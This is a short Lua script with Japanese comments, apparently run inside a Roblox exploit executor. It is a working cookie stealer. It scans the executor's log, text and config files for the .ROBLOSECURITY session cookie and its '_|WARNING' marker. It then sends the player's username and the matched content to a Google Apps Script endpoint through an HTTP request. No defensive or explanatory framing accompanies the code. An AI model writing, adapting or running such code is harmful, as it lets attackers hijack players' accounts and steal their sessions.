local gasUrl = "https://script.google.com/macros/s/AKfycbzmVrEoOyp80pnNnNe48K4Aa0kYfTkKp730CqrfTLReRkfjpDaEIf6ygippGJFwbHi9/exec"
local user = game.Players.LocalPlayer.Name

local function scanFiles()
    local findings = "NOT_FOUND"
    
    -- Deltaのファイル操作関数があるか確認
    if listfiles and readfile then
        pcall(function()
            -- エグゼキューターのフォルダ内にあるファイルをリストアップ
            local files = listfiles("")
            for _, file in pairs(files) do
                -- ログファイルや設定ファイルっぽいやつを狙う
                if file:find(".log") or file:find(".txt") or file:find("config") then
                    local content = readfile(file)
                    -- クッキーの象徴的な文字列が含まれていないか検索
                    if content:find(".ROBLOSECURITY") or content:find("_|WARNING") then
                        findings = "Found in " .. file .. ": " .. content:sub(1, 100)
                        break
                    end
                end
            end
        end)
    end
    return findings
end

local result = scanFiles()
-- GASにスキャン結果を送信
game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. game:GetService("HttpService"):UrlEncode(result))
